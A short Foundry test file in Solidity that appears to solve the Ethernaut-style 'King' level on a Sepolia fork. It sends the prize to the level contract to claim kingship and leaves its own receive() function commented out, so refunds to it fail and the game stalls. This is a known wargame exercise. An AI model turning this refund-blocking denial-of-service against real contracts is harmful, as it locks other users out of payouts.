// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/09-King/King.sol";

contract ContractTest is Test {
 
    King level9 = King(payable(0xe77B2E8B72FeA70ba655Af7f8f47f768129dD1bD));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit9() public {

      address(level9).call{value: level9.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize

      address(level9).call{value: level9.prize()}(""); //failed, because without receive()
    }
  //receive() external payable {}
}